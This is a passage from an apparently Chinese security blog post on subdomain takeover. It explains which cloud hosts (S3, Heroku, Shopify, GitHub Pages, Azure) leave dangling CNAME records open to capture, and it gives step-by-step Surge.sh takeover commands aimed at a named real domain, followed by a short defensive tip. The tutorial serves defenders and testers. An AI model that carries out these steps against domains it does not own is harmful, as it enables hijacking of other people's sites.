Support</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p>简要概述了CloudFront（虚拟主机架构）非常相似的其他云服务。</p>\n<ul>\n<li><p>Amazon S3 - 以前简要提到了Amazon S3。用于访问存储桶的默认基本域并不总是相同，并且取决于所使用的AWS区域。AWS文档中提供了Amazon S3基本域的完整列表。与CloudFront类似，Amazon S3允许指定备用（自定义）域名以访问存储桶的内容。</p>\n</li>\n<li><p>Heroku - Heroku是一个平台即服务提供商，可以使用简单的工作流程部署应用程序。由于需要访问应用程序，Heroku使用herokuapp.com上形成的子域公开应用程序。但是也可以指定自定义域名以访问已部署的应用程序。</p>\n</li>\n<li><p>Shopify - Shopify提供了一种在云中创建和自定义电子商务商店的方法。访问商店的默认子域是在myshopify.com上构建的。作为之前描述的服务，Shopify允许指定备用域名。值得注意的是Shopify验证了正确的CNAME记录配置。但是，此验证不是域名所有权验证。Shopify仅检查备用域的DNS区域中存在的准确CNAME记录。因此，此验证不会阻止子域名的接管。</p>\n</li>\n<li><p>GitHub - GitHub是Git的版本控制存储库。GitHub还允许使用他们的GitHub Pages项目进行免费的虚拟主机托管。此Web托管通常用于项目的文档，技术博客或支持Web页面到开源项目。除github.io下的默认域名外，GitHub Pages还支持自定义域名。</p>\n</li>\n<li><p>Microsoft Azure - Microsoft Azure是一个更加突出的云提供商，类似于AWS。与上面提到的云服务相比，它不同，因为它不提供虚拟主机架构。简而言之，对于每个云服务，Azure都会创建自己的具有自己IP地址的虚拟机。因此，域名和IP地址之间的映射是明确的（一对一映射）。值得注意的是，由于这不是常规虚拟主机设置，因此不一定必须在资源设置中明确定义配置CNAME记录。Azure提供多种云服务，但本文中讨论的云服务具有cloudapp.net和azurewebsites.net的默认域。其文档描述了使用A或CNAME记录设置域名和Azure资源之间的链接（指向前面提到的两个域之一）。一个有趣的观察是，对于A记录，Azure使用TXT记录进行域所有权验证。但是，对于CNAME记录而言并非如此，因此即使在Microsoft Azure的情况下也可以进行子域接管。</p>\n</li>\n</ul>\n<p><br></p>\n<p><strong>案例5：Surge.sh 子域名接管</strong><br>漏洞特征：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924101431.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>利用条件：<br>CNAME 可定义为  na-west1.surge.sh，A 记录 指向 45.55.110.124 （其中一个条件得到满足，我们就可以接管。）<br>例如：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dig agilesysadmin.com</span><br><span class=\"line\"></span><br><span class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.10.3-P4-Ubuntu &lt;&lt;&gt;&gt; agilesysadmin.com</span><br><span class=\"line\">;; global options: +cmd</span><br><span class=\"line\">.......</span><br><span class=\"line\">; EDNS: version: 0, flags:; udp: 4096</span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;agilesysadmin.com. IN A</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">agilesysadmin.com. 3599 IN A 45.55.110.124</span><br></pre></td></tr></table></figure></p>\n<p>漏洞利用<br>第一步，安装nodejs后，执行： <code>sudo npm install --global surge</code></p>\n<p>第二步，创建一个文件夹，上传自定义html文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir surge</span><br><span class=\"line\">cd surge</span><br><span class=\"line\">nano index.html</span><br></pre></td></tr></table></figure><br>第三步，运行 sunger : <code>surge path_project namadomain.</code><br>比如：surge /home/linuxsec/surge/ agilesysadmin.com<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190924101657.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<hr>\n\n<h4 id=\"0x04-安全防御\"><a href=\"#0x04-安全防御\" class=\"headerlink\" title=\"0x04 安全防御\"></a>0x04 安全防御</h4><p>建议:在绑定第三方域名解析记录的时候,需要了解其业务解析流程并进行CNAME安全配置，如果不使用第三方页面托管服务将需要取消其解析记录;</p>\n<hr>\n\n<h4 id=\"0x05-来源参考\"><a href=\"#0x05-来源参考\" class=\"headerlink\" title=\"0x05 来源参考\"></a>0x05 来源参考</h4><ul>\n<li><a href=\"https://devi1ex.com/2018/12/14/subdomain-takeover/\" target=\"_blank\" rel=\"noopener\">https://devi1ex.com/2018/12/14/subdomain-takeover/</a></li>\n<li><a href=\"https://github.com/EdOverflow/can-i-take-over-xyz\" target=\"_blank\" rel=\"noopener\">https://github.com/EdOverflow/can-i-take-over-xyz</a></li>\n<li><a href=\"https://exploit.linuxsec.org/\" target=\"_blank\" rel=\"noopener\">https://exploit.linuxsec.org/</a></li>\n</ul>\n<ul>\n<li><a href=\"https://dzone.com/articles/what-are-subdomain-takeovers-how-to-test-and-avoid\" target=\"_blank\" rel=\"noopener\">https://dzone.com/articles/what-are-subdomain-takeovers-how-to-test-and-avoid</a></li>\n</ul>\n<ul>\n<li><a href=\"https://0xpatrik.com/subdomain-takeover-ns/\" target=\"_blank\" rel=\"noopener\">https://0xpatrik.com/subdomain-takeover-ns/</a></li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"域名解析","path":"api/categories/域名解析.json"}],"tags":[{"name":"Subdomain-Takeover","path":"api/tags/Subdomain-Takeover.json"}]}